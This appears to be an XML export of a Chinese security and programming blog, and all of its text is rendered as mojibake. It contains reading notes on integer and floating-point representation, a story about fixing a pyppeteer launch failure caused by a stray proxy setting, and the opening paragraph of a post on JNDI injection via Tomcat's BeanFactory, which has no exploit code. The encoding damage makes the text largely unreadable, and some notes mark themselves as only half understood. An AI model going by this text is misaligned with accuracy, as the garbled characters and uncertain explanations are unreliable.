<li>å› ä¸ºç›´æ¥è®¡ç®—æ•´æ•°çš„ä¹˜æ³•ç›¸å½“æ…¢ï¼Œæ‰€æœ‰è®¡ç®—æœºé‡‡ç”¨äº†å¦ä¸€ç§æ–¹å¼ï¼Œé€šè¿‡ç§»ä½åŠ åŠ å‡æ³•çš„æ–¹å¼æ¥æå‡è®¡ç®—é€Ÿåº¦ï¼Œé€šè¿‡ç”Ÿé¢çš„å¼å­æ¨å¯¼æˆ‘ä»¬å·²ç»çŸ¥é“å‘å·¦ç§»ä½å°±æ˜¯ä¹˜ä»¥2**k åŒç†å‘åˆç§»ä½å°±æ˜¯é™¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†ä¹˜æ³•æ“ä½œè½¬æ¢ä¸ºç§»ä½å’ŒåŠ å‡æ³•æ“ä½œäº†ï¼Œå¦‚x<em>14ï¼Œæˆ‘ä»¬åœ¨è®¡ç®—çš„æ—¶å€™14&#x3D;2</em>*3+2**2+2**1ï¼Œäºæ˜¯ä¸Šé¢çš„å¼å­å˜æˆäº†x&lt;&lt;3+x&lt;&lt;2+x&lt;&lt;1ï¼Œå¦‚æ­¤ä¾¿å®ç°äº†ä¹˜æ³•è¿ç®—çš„è½¬æ¢ã€‚</li>
<li>å¯¹äºä¹˜æ³•æ¥è¯´ï¼Œæ— è®ºæ˜¯è¡¥ç è¿˜ä¼šæ— ç¬¦å·æ•°é€šè¿‡ç§»ä½å¾—åˆ°çš„ç»“æœæ€»æ˜¯æ»¡è¶³ä¸Šé¢çš„è§„å¾‹ï¼Œå¦‚4ä½è¡¥ç -5*2&#x3D;-10[10110]ï¼Œäº§ç”Ÿäº†æº¢å‡ºæˆªå–æœ€é«˜ä½ä¹‹åçš„å€¼ä¸º 6[0110] é€šè¿‡ç§»ä½-5[1011] ä¹‹åä¸º6[0110]ï¼Œç»“æœä¸€è‡´ã€‚</li>
<li>å¯¹äºé™¤æ³•åŒæ ·å¯ä»¥é‡‡ç”¨å‘å³ç§»ä½çš„æ–¹å¼ï¼Œä¸è¿‡å…¶æƒ…å†µæ›´ä¸ºå¤æ‚ï¼Œå¯¹äºæ— ç¬¦å·æ•°æ¥è¯´ç®€å•çš„ç§»ä½å°±å¯ä»¥æå®šï¼Œä½†æ˜¯å¯¹äºæœ‰ç¬¦å·æ•°åˆ™è¦å¤æ‚å¾—å¤šã€‚ä¸è¿‡è¿˜éœ€è¦è€ƒè™‘çš„ç›´æ¥è¿›è¡Œé™¤æ³•æ˜¯ä¼šå¾—åˆ°å°æ•°çš„ï¼Œè€Œç§»ä½æ“ä½œæ˜¯ä¸ä¼šäº§ç”Ÿå°æ•°çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªå†²çªæ€ä¹ˆè§£å†³çš„å‘¢ï¼Ÿæ­£çš„å°æ•°å‘ç”Ÿå‘ä¸‹èˆå…¥ï¼Œè´Ÿçš„å°æ•°å‘ç”Ÿå‘ä¸Šèˆå…¥ã€‚</li>
<li>æ— ç¬¦å·æ•°çš„é™¤æ³•ï¼Œå› ä¸ºé™¤æ³•è¿ç®—ä¼šäº§ç”Ÿå°æ•°ï¼Œåœ¨è®¡ç®—æ—¶æˆ‘ä»¬éœ€è¦è¿›è¡Œèˆå…¥ã€‚ç°æœ‰wä½è¡¨ç¤ºçš„æ•°xï¼Œå¦‚æœæœ‰ä¸€ä¸ªæ•°k,å–å€¼èŒƒå›´ä¸º1&lt;&#x3D;k&lt;wï¼Œé‚£ä¹ˆ1~kä½çš„æ•°è¡¨ç¤ºä¸ºuï¼Œk+1åˆ°wä½çš„æ•°è¡¨ç¤ºä¸ºyï¼Œé‚£ä¹ˆxå¯ä»¥è¡¨ç¤ºä¸ºx&#x3D;u+y<em>2</em>*k é‚£ä¹ˆx&#x2F;2**k &#x3D; u&#x2F;2**k+yï¼Œæˆ‘ä»¬çŸ¥é“uè‚¯å®šæ˜¯å°äº2**kçš„ï¼Œä¸ä¼šå‘ç”Ÿæ•´é™¤ï¼Œå…¶ä½œä¸ºä½™æ•°è¢«èˆå»ï¼Œæ‰€ä»¥èˆå…¥ä¹‹åæœ‰ç­‰å¼x&#x2F;2**k &#x3D; yï¼Œå³k+1åˆ°wä½çš„æ•°ï¼Œå½“æˆ‘ä»¬å°†xå³ç§»kä½ï¼Œé«˜kä½å¡«å……0ï¼Œä½w-kä½çš„å€¼å°±æ˜¯æœ€å¼€å§‹k+1åˆ°wä½çš„å€¼ã€‚ä½è®¡æ•°ä»0å¼€å§‹ã€‚è¿™å°±æ˜¯é™¤æ³•ç§»ä½çš„è®¡ç®—æ–¹æ³•æ¨å¯¼ã€‚æ¯”å¦‚4ä½æ— ç¬¦å·æ•°5[0101]é™¤ä»¥2ç»“æœä¸º2ï¼Œé€šè¿‡ç§»ä½éœ€è¦ç§»åŠ¨1ä½å³[00101]æœ€ä½ä½èˆå»å¾—åˆ°2[0010]</li>
<li>æœ‰ç¬¦å·æ•°çš„é™¤æ³•ã€‚å¯¹äºæœ‰ç¬¦å·æ•°åœ¨è¿›è¡Œé™¤æ³•æ“ä½œæ—¶å› ä¸ºç§»ä½ä¼šå¯¼è‡´ç¬¦å·ä½ä¸º1æ—¶è¢«å¡«å……ä¸º0ï¼Œé‚£ä¹ˆç»“æœçš„ç¬¦å·å°±å˜åŒ–äº†ï¼Œè€Œæˆ‘ä»¬çŸ¥é“é™¤æ³•è¿ç®—æ˜¯ä¸æ˜¯æ”¹å˜ç¬¦å·çš„ï¼Œè¿™ä¸äº‹å®ä¸ç¬¦ï¼Œæ‰€ä»¥ç®€å•çš„é€»è¾‘ç§»ä½æ˜¯ä¸å¯¹çš„ï¼Œè¿™æ—¶å€™éœ€è¦ç”¨åˆ°ç®—æœ¯ç§»ä½ï¼Œå½“ç„¶äº†ï¼Œè¡¥ç æ­£æ•°çš„è¿ç®—æ–¹æ³•è¿˜æ˜¯å’Œæ— ç¬¦å·æ•°ä¸€æ ·çš„ã€‚æ‰€è°“ç®—æœ¯å”¯ä¸€å°±æ˜¯å³ç§»çš„æ—¶å€™é«˜ä½ä¸æ˜¯å¡«å……0è€Œæ˜¯å¡«å……1ï¼Œå¦‚-5[1011]é™¤ä»¥2å¾—åˆ°-3ï¼Œé€šè¿‡ç§»ä½ä¸º[11011]èˆå»ä½ä½å¾—åˆ°-3[1101]ï¼Œè¿™ä¸ªæ¨å¯¼è¿‡ç¨‹æˆ‘æ²¡çœ‹æ‡‚è¿™å„¿å°±ä¸å†™äº†ã€‚</li>
<li>æµ®ç‚¹æ•°çš„äºŒè¿›åˆ¶è¡¨ç¤º3&#x2F;4&#x3D;1&#x2F;4+2&#x2F;4&#x3D;1&#x2F;4+1&#x2F;2&#x3D;2**(-1)+2**(-2) &#x3D; 0.11 ï¼Œä¸è¿‡è¿™ç§æ–¹å¼ä¸ä¾¿äºè¡¨ç¤ºå¤§æ•°ï¼Œæ•°æ®è¾ƒå¤§çš„æ—¶å€™ä¼šå¯¼è‡´å­˜å‚¨æ•°æ®æ¶ˆè€—å·¨å¤§çš„å­˜å‚¨ç©ºé—´ï¼Œæ‰€ä»¥æœ‰äº†IEEEæ ‡å‡†çš„æµ®ç‚¹æ•°è¡¨ç¤ºæ–¹æ³•ï¼Œå¯¹äºå•ç²¾åº¦æµ®ç‚¹æ•°ç”¨32ä½è¡¨ç¤º1ä¸ªç¬¦å·ä½ï¼Œ8ä¸ªé˜¶ç ï¼Œ23ä¸ªä½æ•°ä½ï¼Œæ•°æŒ‰è¿›åº¦æµ®ç‚¹æ•°ç”¨64ä½è¡¨ç¤ºï¼Œä¸€ä¸ªç¬¦å·ä½ï¼Œ11ä¸ªé˜¶ç ï¼Œ52ä¸ªå°¾æ•°ã€‚ç¬¦å·ä½1è¡¨ç¤ºè´Ÿæ•°0è¡¨ç¤ºæ­£æ•°ï¼Œé˜¶ç æœ‰ä¸‰ç§æ ¼å¼ä¸­æ—¶ä¸åŒ…å«å…¨æ˜¯0ä¸å…¨æ˜¯1çš„è§„æ ¼åŒ–å€¼ï¼Œä¸€ç§æ˜¯å…¨æ˜¯0çš„éè§„æ ¼è¯çš„å€¼ï¼Œå¦ä¸€ç§æ˜¯å…¨æ˜¯1çš„æ— ç©·å¤§çš„å€¼ã€‚å½“ä½¿ç”¨è§„æ ¼åŒ–çš„å€¼çš„æ—¶å€™ï¼Œä½çº§è¡¨ç¤º&#x3D;æµ®ç‚¹æ•°çš„æŒ‡æ•°å°¾æ•°ï¼ˆé˜¶ç ï¼‰+åç½®å€¼ï¼Œè¿™ä¸ªåç½®å€¼å¯¹äºå•ç²¾åº¦æµ®ç‚¹æ•°æ¥è¯´ä¸º127ï¼Œå¯¹åŒç²¾åº¦æ¥è¯´ä¸º1023ï¼Œæ‰€ä»¥å¯¹å•ç²¾åº¦æ¥è¯´æœ€å¤šå¯ä»¥è¡¨ç¤ºçš„æŒ‡æ•°ä½ä¸º-126~127ï¼ŒåŒç²¾åº¦ä¸º-1022 ~ 1023ã€‚å°¾æ•°è¿™éƒ¨åˆ†æ€ä¹ˆè®¡ç®—çš„æˆ‘è¿˜æ²¡çœ‹æ˜ç™½ã€‚å¯¹äºç‰¹æ®Šå€¼çš„é˜¶ç æ¥è¯´ï¼Œå½“å°æ•°ä½å…¨ä¸º0çš„æ—¶å€™è¡¨ç¤ºæ— æ±‚å¤§ï¼Œæ­£æ— ç©·è¿˜æ˜¯è´Ÿæ— ç©·ç”±ç¬¦å·ä½æ§åˆ¶ã€‚å¯¹äºéè§„æ ¼åŒ–é˜¶ç ï¼Œå…¶æä¾›äº†0çš„è¡¨ç¤ºæ–¹æ³•ï¼Œå› ä¸ºè§„æ ¼åŒ–çš„è¡¨ç¤ºå°¾æ•°å¿…é¡»å¤§äº1ï¼Œåˆ™ä¸å¯èƒ½è¡¨ç¤º0ï¼ŒåŒæ ·çš„è¿™ç§æ–¹å¼è¡¨ç¤ºçš„0çš„ç¬¦å·ç”±ç¬¦å·ä½æ§åˆ¶ä¹Ÿå°±æ˜¯äº§ç”Ÿäº†æ­£0ä¸è´Ÿ0ä¸¤ç§ç»“æœï¼Œè¿™ä¸¤ç§ç»“æœåœ¨æœ‰äº›æƒ…å†µä¸‹ç›¸ç­‰åœ¨æœ‰äº›æƒ…å†µä¸‹ä¸ç›¸ç­‰ã€‚</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡Pyppeteerè°ƒè¯•è§£å†³--Browser closed unexpectedly--çš„é—®é¢˜</title>
    <url>/archives/ef2b93c5.html</url>
    <content><![CDATA[<p>äº‹æƒ…æ˜¯é…±å©¶å„¿çš„ï¼š<br>æˆ‘æ›¾ç»æ˜¯ä¸ªé“ä»”ï¼Œå¯åæ¥æˆ‘å¦ˆæ¥äº†â€¦â€¦.<br>å¥¹å‘Šè¯‰æˆ‘è¿‡å¹´æƒ³æŠ±å­™å­â€¦..<br>æˆ‘è¯´ï¼Œå•Šï¼Œè¿™â€¦â€¦.<br>æˆ‘ä¸åšé“ä»”å¾ˆå¤šå¹´äº†â€¦â€¦<br>è¿™ç§äº‹å»æ‰¾å¹ºå¨ƒå­å°±å¥½äº†â€¦â€¦â€¦.<br>emoâ€¦â€¦..</p>
<span id="more"></span>


<p>æˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬ç›‘æ§å…ˆçŸ¥ã€freebufä»¥åŠå®‰å…¨å®¢è®ºå›ä¸Šé¢çš„æ–‡ç« æ›´æ–°ï¼Œå› ä¸ºå…ˆçŸ¥æ¶å¿ƒçš„åçˆ¬è™«æœºåˆ¶æ‰€ä»¥ä½¿ç”¨äº†Chromiumæ— å¤´æµè§ˆå™¨é…åˆpyppeteeræ¥è¿›è¡Œç›‘æ§ï¼Œå‰ä¸¤å¤©è¿è¡Œçš„å¾ˆä¸æ»‘ï¼Œä½†ä»Šå¤©è¿è¡Œçš„æ—¶å€™å‘ç°ç•Œé¢ä¸€ç›´å¡ä½ä¸åŠ¨ï¼Œå°±åƒä¸‹é¢è¿™æ ·å­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b9a60352e0de708de86823eac1feddae.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™èƒ½è®¤å—ï¼Œè¿™ä¸èƒ½å¿ã€‚äºæ˜¯æˆ‘ï¼š<br>æ‰¾åˆ°äº†ä¸‡èƒ½çš„å°å†°ï¼Œå°å†°ä¸çŸ¥æ‰€æªï¼Œå‘¸ï¼Œåƒåœ¾ï¼›<br>æ‰¾åˆ°äº†åº¦å¨˜ï¼Œåº¦å¨˜ä¸çŸ¥æ‰€æªï¼Œå‘¸ï¼Œåƒåœ¾ï¼›<br>æ‰¾åˆ°äº†è°·å“¥ï¼Œè°·å“¥ä¸çŸ¥æ‰€æªï¼Œå‘¸ï¼Œåƒåœ¾ï¼›<br>è¿˜æœ‰ä»€ä¹ˆåƒåœ¾å°½ç®¡æ”¾é©¬è¿‡æ¥ï¼Ÿ<br>åœ¨åº§çš„éƒ½æ˜¯åƒåœ¾ã€‚<br>å¿æ— å¯å¿ä¹‹ä¸‹æˆ‘åªå¥½è‰°éš¾å¾—çˆ¬èµ·æ¥å°è¯•ç€å®šä½é—®é¢˜åœ¨å“ªã€‚<br>é€šè¿‡ä¸æ–­çš„printï¼Œå®šä½åˆ°äº†è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d8c29df09f7bf126443dfc2902b1e9fb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åªæ‰“å°4ï¼Œ2è®©ä½ åƒäº†ï¼Ÿ<br>30ç§’åã€‚ã€‚ã€‚ã€‚ã€‚æŠ¥é”™äº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8eaedcd35755b6a89156748de6f54a5d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æµè§ˆå™¨ä¸çŸ¥æ‰€æªï¼š<br>æœæ–­æ‰“æ–­ç‚¹ï¼Œè¿›åˆ°lunchæ–¹æ³•é‡Œé¢ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/69aa61a0c95bfdd6ff5fd4adfd475269.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>Launcherç±»çš„launchæ–¹æ³•ï¼Œå…ˆå¯¹Launcherç±»è¿›è¡Œåˆå§‹åŒ–ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/56a46c6eb13a64c10ba32e719c249fe5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ²¡å•¥å±Œç”¨ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯çœ‹äº†å¥½ä¹…ï¼Œæ€•é”™è¿‡ä»€ä¹ˆï¼Œæˆ‘ä¸€æ­¥ä¸€æ­¥çœ‹çš„ï¼Œè¿˜æ˜¯æœ‰æ”¶è·ï¼Œç„¶åè°ƒç”¨launchæ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/573dab837eb35425fa50c1944a4fc1ac.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„Popenæ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b1734163dcbcf28653a960faa0fb121e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­¤å¤„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ‰“å¼€äº†chromiumæµè§ˆå™¨ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c0669cb626fdf0f2b5859a07c21c5b3d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå½“æˆ‘å•æ­¥åˆ°ä¸Šå›¾çº¢æ¡†æ‰§è¡Œå®Œä¹‹åpycharmå°±åœä½äº†ï¼Œ30såç³»ç»Ÿcrashäº†ï¼Œæ‰€ä»¥é—®é¢˜å°±å‡ºåœ¨ä¸Šå›¾æ–­ç‚¹å¤„ï¼Œè¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e378c98e7a2052e00b3432fbef52fd6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œè°ƒç”¨urlopenæ–¹æ³•è®¿é—®äº†<code>http://127.0.0.1:64443/json/version</code>ï¼Œç„¶åå½“æˆ‘å†å¾€ä¸‹çš„æ—¶å€™ï¼Œå°±è¿›å…¥äº†excepté‡Œé¢ï¼Œè¯æ˜é‡Œé¢å‡ºé”™äº†ï¼Œå¤§æ¦‚ç‡æ˜¯urlè¯·æ±‚å‡ºé”™ï¼Œæ‰€ä»¥æˆ‘åœ¨æµè§ˆå™¨è®¿é—®äº†ä¸€ä¸‹è¿™ä¸ªèµ„æºï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/93143ec440760a0710a12020fdd9616a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆä¸æ»‘ï¼Œè®²é“ç†ä¸ä¼šæŠ¥é”™æ‰å¯¹ï¼Œä¸ä¿¡é‚ªçš„æˆ‘åˆåœ¨å…¶ä»–æ–‡ä»¶ç”¨urlopenæ‰“å¼€äº†ä¸€ä¸‹è¿™ä¸ªèµ„æºï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5b786080484a93e6ecdcd5cd2a227f19.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>bingo!!æŠ¥é”™äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆäº†ï¼Œæˆ‘åˆæ¢äº†requestè¯·æ±‚äº†ä¸€æ¬¡ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/79e0fc1ee4fc3bf1dc874c4d0e005db1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆæŠ¥é”™äº†ï¼Œè€Œä¸”æä¾›äº†æˆ‘ä»¬æ›´å¤šçš„ä¿¡æ¯ï¼ŒProxyErrorã€‚è¿™å°¼ç›ï¼Œæ€¥çš„æˆ‘ç«‹é©¬å»æŸ¥äº†ä¸‹æˆ‘æ‰€æœ‰çš„ä»£ç†å‘ç°éƒ½æ˜¯å…³ç€çš„â€¦..<br>è£‚äº†ï¼Œåæ¥ä¸Šç½‘æœäº†æœä»£ç†å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œé…ç½®ï¼Œå¯ä»¥åœ¨é«˜çº§ç³»ç»Ÿè®¾ç½®é‡Œé¢çœ‹åˆ°æœ‰æ²¡æœ‰ä¸€ä¸ªhttp_proxyçš„å­—æ®µã€‚æˆ‘ä¸€çœ‹ï¼Œå°¼ç›ï¼Œè¿˜çœŸæœ‰ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a6875f0b92a546027f4d3405d8294d4a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»–å¨˜çš„ï¼Œæœæ–­åˆ é™¤ï¼Œé‡å¯pycharmè¿è¡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9ab74e0be63933b527fcef27aba51d6d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸æ»‘ï¼Œæ‰“å®Œæ”¶å·¥ï¼ï¼ï¼<br>ä¸è¿‡è¿™ä¸ªä»£ç†ä»–ä¹ˆå“ªæ¥çš„å‘¢ï¼Ÿï¼Ÿ<br>æƒ³èµ·æ¥äº†ï¼Œæ˜¨æ™šå¤ç°GLPIçš„ä¸€ä¸ªæ¼æ´å®‰è£…ç¯å¢ƒè¦å®‰è£…PHPçš„composerï¼Œè¿™ä¸ªåƒåœ¾ç©æ„å„¿å½“æ—¶è®©æˆ‘è®¾ç½®ä¸ªä»£ç†ï¼Œè¿˜ä¸èƒ½å–æ¶ˆã€‚æœ€åç¯å¢ƒä¹Ÿæ²¡æœ‰æ‰“èµ·æ¥ï¼Œç®€ç›´å¤ªå‘äº†ã€‚</p>
]]></content>
      <categories>
        <category>bugä¿®å¤</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>pyppeteer</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿè¯»ä¹¦ç¬”è®°ï¼ˆäºŒï¼‰</title>
    <url>/archives/b4c5d320.html</url>
    <content><![CDATA[<ul>
<li>æ•°æ®çš„è¡¨ç¤ºï¼Œæ— ç¬¦å·æ•°ä¸€ä½å°±æ˜¯ä¸€ä¸ªæ•°ï¼Œæœ‰ç¬¦å·æ•°é‡‡ç”¨è¡¥ç çš„å½¢å¼è¡¨ç¤ºï¼Œæœ€é«˜ä½ä¸ºè´Ÿæƒï¼Œå½“æœ€é«˜ä½ä¸º1æ—¶å…¶æƒé‡ä¸º-x(2**ï¼ˆw-1))ï¼Œwä¸ºä½æ•°ï¼Œxä¸ºæœ€é«˜ä½çš„å–å€¼ã€‚äºæ˜¯ä¹ä¸€ä¸ªæœ‰ç¬¦å·æ•°çš„è¡¥ç è¡¨ç¤ºå°±æˆäº†æ‰€æœ‰æ­£æƒä¸è´Ÿæƒä¹‹å’Œã€‚</li>
<li>ä¸€ä¸ªæ•´æ•°èƒ½è¢«äºŒè¿›åˆ¶æ–¹å¼è¡¨ç¤ºï¼Œå…¶æ ¹æºåœ¨äºå…¶ç¼–ç æ–¹å¼çš„å”¯ä¸€æ€§ï¼Œå³åŒå°„ï¼Œè§£é‡Šå°±æ˜¯ä¸€ä¸ªæ•°åœ¨ç¼–ç åæœ‰å”¯ä¸€çš„ä¸€ä¸ªäºŒè¿›åˆ¶æ ¼å¼ä¸ä¹‹å¯¹åº”ï¼Œè€Œè¿™ä¸ªäºŒè¿›åˆ¶æ’åˆ—é¡ºåºåœ¨è½¬æ¢ä¸ºæ•´æ•°åä¹Ÿæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ•°ä¸ä¹‹å¯¹åº”ã€‚å°±æƒ³æ•°å­¦é‡Œçš„åå‡½æ•°ä¸€æ ·ã€‚</li>
<li>åŸç è¡¨ç¤ºæœ‰ç¬¦å·æ•°é€šè¿‡æœ€é«˜ä½ä½œä¸ºç¬¦å·ä½ï¼Œå¦‚æœæœ€é«˜ä½ä¸º1ï¼Œåˆ™å‰©ä¸‹çš„ä½å–è´Ÿæƒï¼Œå¦‚æœæœ€é«˜ä½ä¸º0ï¼Œåˆ™å‰©ä¸‹çš„ä½å–æ”¿æƒ</li>
<li>åç è¡¨ç¤ºæœ‰ç¬¦å·æ•°ï¼Œæœ€é«˜ä½çš„æƒé‡ä¸º-x.(2**(2-1)-1) xä¸ºæœ€é«˜ä½çš„å–å€¼</li>
<li>æ•´æ•°ç±»å‹çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå°†ä¸€ä¸ªæ— ç¬¦å·æ•°è½¬æ¢ä¸ºæœ‰ç¬¦å·æ•°æ—¶äºŒè¿›åˆ¶ä½çš„æ•°æ®ä¸å˜ï¼Œå˜çš„åªæ˜¯è§£é‡Šè¿™äº›ä½çš„æ–¹å¼ã€‚</li>
<li>ä¸€ä¸ªè§„å¾‹ï¼šä¸€ä¸ª4ä½æœ‰ç¬¦å·æ•°-1ï¼Œå…¶å¼ºè½¬ä¸ºæ— ç¬¦å·æ•°ä¹‹åä¸º15ï¼Œæ³¨æ„åˆ°1+15 &#x3D; 16 &#x3D; 2*<em>4ã€‚è¿™æ ·å°±èƒ½å¾ˆæ–¹ä¾¿å¾—è¿›è¡Œè´Ÿæ•°æœ‰ç¬¦å·æ•°è½¬ä¸ºæ— ç¬¦å·æ•°ï¼Œå½“ç„¶æ­£æ•°ä¸¤ç§è¡¨ç¤ºæ–¹å¼çš„ç»“æœéƒ½ä¸€æ ·ï¼Œå½“ç„¶ä¸€åˆ‡éƒ½å»ºç«‹åœ¨æœ‰ç¬¦å·æ•°ä½¿ç”¨è¡¥ç è¡¨ç¤ºã€‚å…¶åŸç†ä¸ºï¼Œæœ€é«˜ä½æƒé‡ï¼Œå¯¹äºä¸€ä¸ª4ä½è¡¨ç¤ºçš„æ•´æ•°ï¼Œ å½“ä½¿ç”¨è¡¥ç æ—¶ï¼Œæœ€é«˜ä½ä¸º1æ—¶æƒé‡ä¸º-8ï¼Œä½¿ç”¨æ— ç¬¦å·æ•°æ—¶å…¶æƒé‡ä¸º8ï¼Œä¸¤è€…ä¹‹é—´å·®äº†2</em>***4 &#x3D; 16ã€‚</li>
<li>å°†æ— ç¬¦å·æ•°è½¬æ¢ä¸ºæœ‰ç¬¦å·æ•°çš„æ—¶å€™ï¼Œå½“æ— ç¬¦å·æ•°å°äºç­‰äºæœ‰ç¬¦å·æ•°çš„æœ€å¤§å€¼çš„æ—¶å€™ä¿æŒä¸å˜ï¼Œå½“æ— ç¬¦å·æ•°å¤§äºæœ‰ç¬¦å·æ•°çš„æœ€å¤§å€¼çš„æ—¶å€™ï¼Œè½¬æ¢åçš„å€¼ä¸ºU-2**wï¼ŒUä¸ºå½“å‰æ— ç¬¦å·æ•°ï¼ŒwäºŒè¿›åˆ¶ä½æ•°ã€‚</li>
<li>æ— ç¬¦å·æ•°çš„é•¿åº¦æ‰©å±•æ˜¯é›¶æ‰©å±•ï¼Œå³å¤§ç«¯æ³•è¡¨ç¤ºåœ¨å·¦ä¾§å¡«å……0ï¼Œå¯¹äºæœ‰ç¬¦å·æ•°åˆ™æ˜¯ç¬¦å·å¡«å……ï¼Œè´Ÿæ•°å¡«å……1ï¼Œæ­£æ•°å¡«å……0</li>
<li>åœ¨å°†ä¸€ä¸ªé•¿åº¦è¾ƒå°çš„æœ‰ç¬¦å·æ•°å˜æˆæ— ç¬¦å·é•¿åº¦è¾ƒå¤§çš„æ•°çš„æ—¶å€™ï¼Œæ˜¯å…ˆè¿›è¡Œç¬¦å·å¡«å……å†è¿›è¡Œç¬¦å·è½¬æ¢çš„ï¼Œå¦‚æœé¡ºåºé”™äº†å°†äº§ç”Ÿå®Œå…¨ä¸ä¸€æ ·çš„ç»“æœã€‚</li>
<li>å½“ä¸€ä¸ªæœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°è¿›è¡Œè¿ç®—æ—¶ä¼šå‘ç”Ÿéšå¼ç±»å‹è½¬æ¢ï¼Œé¡¹èŒƒå›´æ›´å¹¿çš„å€¼è½¬æ¢ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯éç›´è§‚çš„ï¼Œå¾€å¾€ä¼šå¯¼è‡´å¾ˆå¤šé¢„æ–™ä¹‹å¤–çš„ç»“æœã€‚</li>
</ul>
]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡Tomcat BeanFactory ç»•è¿‡é«˜ç‰ˆæœ¬JDK CodeBaseé™åˆ¶å®ç°JNDIæ³¨å…¥</title>
    <url>/archives/42623881.html</url>
    <content><![CDATA[<p>ä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬è®¨è®ºäº†é€šè¿‡Referenceæ–¹æ³•å®ç°è¿œç¨‹æ¶æ„ç±»çš„è‡ªåŠ¨åŠ è½½ï¼Œæœ€ç»ˆæä¾›äº†ä¸€ç§ä½¿ç”¨æœ¬åœ°ç±»ç»•è¿‡truseURLCodeBaseçš„æ–¹æ³•ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„è¿œç¨‹æ¶æ„ç±»è¦æ»¡è¶³çš„ä¸¤ä¸ªæ¡ä»¶æ˜¯ï¼Œé¦–å…ˆè¦å®ç°ObjectFactoryæ¥å£ï¼Œè¿™æ˜¯å……åˆ†å¿…è¦æ¡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªå……åˆ†ä¸å¿…è¦æ¡ä»¶å°±æ˜¯è¦é‡å†™javax.naming.spi.ObjectFactoryæ–¹æ³•ã€‚å› ä¸ºæœ¬åœ°ç±»çš„å†…å®¹æ˜¯æˆ‘ä»¬ä¸å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½å»è‡ªå·±å†™é™æ€ä»£ç å—ã€å®ä¾‹ä»£ç å—ä¸æ— å‚æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»Šå¤©è¦æ‰¾çš„æœ¬åœ°ç±»ä¹Ÿå°±å¿…é¡»è¦å®ç°getObjectInstanceæ–¹æ³•ä¸”æœ‰å¯åˆ©ç”¨çš„ç‚¹ï¼Œæˆ‘ä»¬åœ¨Tomcatçš„æºç ä¸­æ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªå¯»æ‰¾æŸä¸€ä¸ªç±»å®ç°ç±»çš„å¿«æ·é”®ï¼Œæˆ‘ä»¬åœ¨IDEAä¸­å®‰Ctrl+Hå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»äº†ã€‚</p>
